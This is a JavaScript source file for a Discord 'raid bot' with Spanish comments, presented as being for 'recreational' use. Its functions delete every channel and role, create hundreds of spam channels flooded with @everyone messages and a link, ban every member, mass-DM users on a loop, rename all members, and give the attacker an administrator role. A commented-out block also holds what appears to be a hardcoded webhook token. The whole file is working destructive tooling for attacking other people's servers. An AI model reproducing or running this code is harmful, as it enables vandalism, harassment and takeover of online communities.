/**
 * 
 * BOT DE RAID PARA SERVIDORES DE DISCORD
 * 
 * Desarrollado por Alejandro Garcia
 * Programador y hacker etico
 * Discord: @AlejandroGarcia#7590
 * 
 * Uso para fines recreativos
 * 
 * Version: MinelordNonSecurity v2.0.0
 * Fecha de lanzamiento 29/octubre/2022
 * 
 */

const Discord = require("discord.js");
const variables = require('./variables.json');
//const chalk = require('chalk');
//const express = require('express');

const { server, usuario}  = require('./index');
const { channel } = require("diagnostics_channel");

async function CrearCanales(message) {
    await Report(`Creando nuevos canales`, 1);

    try {
        //message.guild.channels.cache.forEach(channel => channel.delete().catch(err => { }));
        message.guild.channels.create(`${variables.nombreCanal}`, {
            type: 'text'
        }).then(channel => {
            for (var i = 0; i <= 3; i++) {
                channel.send(`@everyone ${variables.mensaje}\n${variables.link}`).catch(err => { });
            }
        }).catch(err => { });

        for (let i = 0; i <= 500; i++) {
            message.guild.channels.create(`${variables.nombreCanal}`, {
                type: 'text'
            }).then(channel => {
                for (var i = 0; i <= 50; i++) {
                    channel.send(`@everyone ${variables.mensaje}\n${variables.link}`).catch(err => { });
                }

            }).catch(err => { })
        }
    } catch (err) {
        await Report(`No se han podido crear nuevos canales`, 3);
        return;
    }
}

async function Banear(message) {
    await Report(message, `Intentando banear usuarios`, 1);
    try {
        if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
        message.guild.members.cache.forEach(member => {
            if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
                //if(member.hasPermission("ADMINISTRATOR")) { return; };
                member.ban().catch(err => { });
            }
        }).catch(err => { })
    } catch (err) {
        await Report(message, `Se han baneado todos los usuarios posibles`, 2);
        return;
    }

}

async function Nuke(message) {
    await Report(message, `Borrando todos los canales`, 1);

    try {
        message.guild.channels.cache.forEach(chl => {//function(channel){
            if (message.channel.id == chl.id){
                //chl.delete().catch(err => { });
                //console.log("Canal omitido " + message.channel.id);
            } else {
                chl.delete().catch(err => { });
            }
            //console.log("CANAL DEL MENSAJE " + message.channel.id);
            //console.log("C: " + chl.id);
        });
        message.guild.channels.create(`${variables.nombreCanal}`, {
            type: 'text'
        }).then(channel => {
            channel.send(`@everyone ${variables.mensaje}\n${variables.link}`).catch(err => { })
        }).catch(err => { })
    } catch (err) {
        await Report(message, `No se han podido borrar todos los canales`, 3);
        console.log("es");
        return;
    }
}
async function MdAll(message) {
    await Report(message, `Enviando mensajes privados masivamente`, 1);

    try {
        message.guild.members.cache.forEach(member => {
            setInterval(function () {
                member.send(`${variables.mensaje}`).catch(error => { });

            }, 450);
        }).catch(err => { })
    } catch (err) {
        return;
    }
}

async function DelRoles(message) {
    await Report(message, `Borrando Roles`, 1);

    try {
        message.guild.roles.cache.map(roles => roles.delete().catch(err => { }));
    } catch (err) {
        await Report(message, `No se han podido borrar todos los roles`, 3);
        return;
    }
}

async function AddRoles(message) {
    await Report(message, `Creando Roles`, 1);

    try {
        for (let i = 0; i <= 50; i++) {
            message.guild.roles.create({ data: { name: `${variables.nombreServer}`, color: '#0F3547', }, reason: 'razon', })
        }
    } catch (err) {
        await Report(message, `No se han podido crear mas roles`, 3);
        return;
    }
}

async function Admin(message) {
    await Report(message, `Otorgando administrador a ` + message.member.user.tag, 1);
    try {
        let rol = await message.guild.roles.create({
            data: {
                name: variables.link,
                color: "B9BBBE",
                permissions: "ADMINISTRATOR",
                hoisted: false
            }
        })

        message.member.roles.add(rol)
            .then(function (role) {
                message.member.addRole(role);
                if (message.deletable) message.delete().catch(e => { });
            })
            .catch(e => { });
    } catch (err) {
        await Report(message, `No se logró otorgar administrador a ` + message.member.user.tag, 3);
        return;
    }

}

async function Stop(message, client) {
    await Report(message, `Intentando detener el bot`, 1);

    message.channel.send('Intentando detenerme... Esto puede llevar algunos minutos')
        .then(message => client.destroy())
        .then(() => client.login(variables.token))
        .then(() => { Report(message, ` El bot se ha detenido exitosamente`, 2) })
        .catch(err => { });
}

async function Nick(message) {
    await Report(message, `Cambiando el nombre de los usuarios a "` + variables.nombreServer + `"`, 1);

    let nickname = variables.nombreServer;
    var i = 0;
    message.guild.members.cache.forEach(member => { i++ });
    message.channel.send("Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**");
    message.guild.members.cache.forEach(member => { member.setNickname(nickname).catch(err => { }) });
}

async function Report(message, reporte, tipo) {
    /*
     1: accion
     2: alerta
     3: error  
    */
    let alerta = "";
    //let usuario = ""//message.member.user.tag;
    //let server = message.guild.id;

    switch (tipo) {
        case 1:
            alerta += "**[ACTION]** ";
            console.log("\x1b[32m", "[ACTION] USER: " + usuario + " GUILD: " + server + " | " + reporte);
            break;
        case 2:
            alerta += "**[WARN]** ";
            console.log("\x1b[33m", "[WARN] USER: " + usuario + " GUILD: " + server + " | " + reporte);
            break;
        case 3:
            alerta += "**[ERROR]** ";
            console.log("\x1b[31m", "[ERROR] USER: " + usuario + " GUILD: " + server + " | " + reporte);
            break;
    }
    /*
    if (variables.weebhookHistory_1 != "") {
        const webhookClient1 = new Discord.WebhookClient({ url: variables.weebhookHistory_1 });
        //const webhookClient1 = new Discord.WebhookClient({ id: '1035289204709670952', token: 'aWcyNkgsDzqXf0lJB5uuKDSpjjqTq0oVu8vLDNgWyhJ7DXX1zX5a7zeQKKQUQfB2HMqj' });
        webhookClient1.send({
            content: alerta + "**USER:** `" + usuario + "` **GUILD:** `" + server + "` " + reporte,
            //username: 'Realtime Raid Reports',
            //avatarURL: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/OOjs_UI_icon_history.svg/1024px-OOjs_UI_icon_history.svg.png',
        }); 
    }
    */
    /*
    if(variables.weebhookHistory_2 != ""){
        const webhookClient2 = new Discord.WebhookClient({ url: variables.weebhookHistory_2 });

        webhookClient2.send({
            content: alerta + "**USER:** `" + usuario + "` **GUILD:** `" + server + "` " + reporte,
            username: 'Realtime Raid Reports',
            avatarURL: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/OOjs_UI_icon_history.svg/1024px-OOjs_UI_icon_history.svg.png',
        });
    }
    */
}

module.exports = {

    "CrearCanales": CrearCanales,
    "Banear": Banear,
    "Nuke": Nuke,
    "MdAll": MdAll,
    "DelRoles": DelRoles,
    "AddRoles": AddRoles,
    "Admin": Admin,
    "Stop": Stop,
    "Nick": Nick,
    "Report": Report
}